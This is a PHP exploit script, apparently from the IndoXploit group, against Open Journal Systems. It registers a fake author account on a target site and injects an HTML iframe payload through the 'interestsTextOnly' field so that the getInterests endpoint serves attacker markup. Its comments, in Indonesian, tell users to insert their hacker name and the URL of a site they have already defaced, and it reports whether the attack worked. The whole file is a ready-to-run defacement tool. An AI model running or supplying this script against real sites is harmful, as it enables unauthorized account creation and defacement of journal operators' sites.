<?php

/**
 * Open Journal System Ajax getInterests
 * Invalid Headers Set for Content Type JSON data
 * 
 * Author: 1337ci
 * Team  : IndoxPloit
 * 
 * Exploit Script Coded by Onzie - IndoXploit
 */

Class OJS_Exploit {
    public  $uri;
	
	// Ganti dengan nama hacker anda
    private $whoami = 'localheartz';


    private $credentials;

    public function __construct() {
        $this->credentials          = (object) $this->credentials;
        $this->credentials->user    = $this->whoami.rand(1, 1337);
        $this->credentials->pass    = "\x69\x6e\x64\x6f\x78\x70\x6c\x6f\x69\x74";
        $this->credentials->email   = $this->credentials->user.'@'.$this->credentials->user.'.id';
    }

    public function setPayload() {
        /* Set payload anda. Ganti url yang pernah anda deface */
        $url     = "http://zonehmirrors.org/defaced/2017/09/16/kosmik.id/kosmik.id/";
        $payload = '-0-hacked-by-'.$this->credentials->user.'-"><center><iframe src='.$url.' height=620px width=1100px scrolling=no frameborder=0>';
        return $payload;
    }

    public function doExploit() {
        $user    = $this->credentials->user;
        $password= $this->credentials->pass;
        $email   = $this->credentials->email;

        $payload = $this->setPayload();

        $curl    = curl_init();
        $options = [
            CURLOPT_URL             => $this->uri."/index.php/index/user/registerUser",
            CURLOPT_RETURNTRANSFER  => TRUE,
            CURLOPT_POST            => TRUE,
            CURLOPT_POSTFIELDS      => "username=$user&password=$password&password2=$password&firstName=$user&lastName=$user&email=$email&confirmEmail=$email&registerAsAuthor=1&interestsTextOnly=$payload",
            CURLOPT_SSL_VERIFYHOST  => FALSE,
            CURLOPT_SSL_VERIFYPEER  => FALSE
        ];
        curl_setopt_array($curl, $options);
        return curl_exec($curl);
        curl_close($curl);
    }

    public function check() {
        $get = @file_get_contents($this->uri."/index.php/index/user/getInterests");
        if(preg_match("/{$this->credentials->user}/i", $get)) {
            echo "[*] Successfully Exploited!\n";
            echo "[*] {$this->uri}/index.php/index/user/getInterests\n\n";
        } else {
            echo "[*] Not Vuln :(\n\n";
        }
    }

    public function run() {
        echo "[+] Trying to Exploit {$this->uri}\n (with username {$this->credentials->user} and password {$this->credentials->pass}) \n";
        $this->doExploit();
        $this->check();
    }
}

$ojs = new OJS_Exploit();
$ojs->uri = $argv[1];
$ojs->run();
